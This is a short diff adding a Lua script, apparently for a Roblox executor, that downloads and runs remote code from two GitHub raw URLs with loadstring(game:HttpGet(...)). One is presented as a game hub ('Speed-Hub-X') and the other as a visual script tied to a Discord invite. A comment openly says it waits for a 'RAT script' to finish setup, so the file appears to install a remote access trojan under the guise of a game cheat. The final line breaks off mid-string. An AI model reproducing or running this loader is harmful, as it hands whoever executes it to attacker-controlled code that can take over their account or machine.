@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VortexWebo/-script--/refs/heads/main/Speed-Hub-X"))()
+
+wait(1) -- short pause to let RAT script finish setup
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9
